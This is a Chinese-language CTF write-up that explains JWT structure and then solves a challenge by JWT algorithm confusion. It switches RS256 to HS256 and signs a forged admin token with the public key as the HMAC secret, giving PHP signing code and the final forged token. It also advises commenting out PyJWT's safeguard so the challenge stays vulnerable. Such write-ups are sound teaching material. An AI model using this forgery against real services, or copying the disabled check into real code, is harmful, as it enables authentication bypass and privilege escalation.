### jwt协议简介

jwt一般长下面这个样子：
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6ImFkbWluIn0.R6Aplj46fUwIeCnnbm5OU2sDTQkG1rvjpW2bGqnfkGE
```
一般由3个部分组成的，由三个.分隔，分别是
```
header
payload
Sinature
```
每一部分都是base64编码的。
#### header
通常由两部分组成：令牌的类型，即JWT和正在使用的散列算法，如HMAC SHA256或RSA。
正如json所显示
```
{
    "alg":"RS256",
    "typ":"JWT"
}
```
alg为算法的缩写，typ为类型的缩写,然后，这个JSON被Base64编码，形成JSON Web Token的第一部分。

#### payload
令牌的第二部分是包含声明的有效负载。声明是关于实体（通常是用户）和其他元数据的声明。
这里是用户随意定义的数据
例如上面的举例
```
{
    "name":"wonderkun",
    "priv":"admin"
}
```
然后将有效载荷Base64进行编码以形成JSON Web Token的第二部分。
但是需要注意对于已签名的令牌，此信息尽管受到篡改保护，但任何人都可以阅读。除非加密，否则不要将秘密信息放在JWT的有效内容或标题元素中。

#### Signature
要创建签名部分，必须采用header，payload，密钥。然后利用header中指定算法进行签名，例如HS256(HMAC SHA256),签名的构成为：

```
HMACSHA256(
  base64Encode(header) + "." +
  base64Encode(payload),
  secret)
```
然后将这部分base64编码形成JSON Web Token第三部分.

### writeup

此题目用到一个jwt的一个漏洞,漏洞详情见[https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)


这其实是一个算法篡改攻击，因为服务器利用的RS256算法，用的是私钥进行签名，公钥进行验证的，然后根据提示：
[/static/js/common.js][/static/js/common.js]
```
function getpubkey(){
    /* 
    get the pubkey for test
    /pubkey/{md5(username+password)}
    */
}
```
我们可以获取到自己的public key。JWT的header部分中，有签名算法标识alg，而alg是用于签名算法的选择，最后保证用户的数据不被篡改。但是在数据处理不正确的情况下，可能存在alg的恶意篡改。我们可以伪造算法为hs256，然后利用我们的获取的public key，来签名伪造的数据，绕过验证。

但是注意，PyJWT库中对这种攻击做了预防，不允许hs256的密钥中出现下面这些字符，具体见algorithms.py:151

```python
        invalid_strings = [
            b'-----BEGIN PUBLIC KEY-----',
            b'-----BEGIN CERTIFICATE-----',
            b'-----BEGIN RSA PUBLIC KEY-----',
            b'ssh-rsa'
        ]

```
部署题目的时候，注意注释掉。

伪造一个数据：

```
{"alg":"HS256","typ":"JWT"}
{"name":"wonderkun","priv":"admin"}
```
两部分进行base64编码之后,合起来：
注意这里的base64是url base64编码，所以对常规的base64编码结果做如下修改：
- 删除等号
- 把 + 变为 -
- 把 / 变为 _
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6ImFkbWluIn0
```

然后获取到 wonderkun用户的pubkey为：

```
{
  "pubkey": "-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCI2am2P9XyshjiU37d5QZBbzyF\nZ7aHg1VMdQSj423cncHKGuGz1sxPzBF+49qGQ2U2MpKDcwXCTKDotTvPm3arm0KZ\nlVp6RclIjYZqbnp0yTVQpO4YLmjBS7GmEMeaRUxDva2tob9BpwBx9RMQ1nPt0Yw4\n7mKHxPKXzUVE2xHiKwIDAQAB\n-----END PUBLIC KEY-----", 
  "result": true
}
```
用pubkey作为 HMAC_sha256的secret,算一下签名：

```php
$s = hash_hmac('sha256', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6ImFkbWluIn0', "-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCI2am2P9XyshjiU37d5QZBbzyF
Z7aHg1VMdQSj423cncHKGuGz1sxPzBF+49qGQ2U2MpKDcwXCTKDotTvPm3arm0KZ
lVp6RclIjYZqbnp0yTVQpO4YLmjBS7GmEMeaRUxDva2tob9BpwBx9RMQ1nPt0Yw4
7mKHxPKXzUVE2xHiKwIDAQAB
-----END PUBLIC KEY-----", true);
$s = base64_encode($s);
$s = str_replace(array('=','+','/'),array('','-','_'),$s);
echo $s;

```

最后合起来:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoid29uZGVya3VuIiwicHJpdiI6ImFkbWluIn0.evD4XNPZ8e2DI9jnt1nH_sJ6zHJx4VZcFjUvk2IYcoM
```

访问/list的时候带上这个jwt token，就可以可以到管理员的note，访问一下，就是flag。
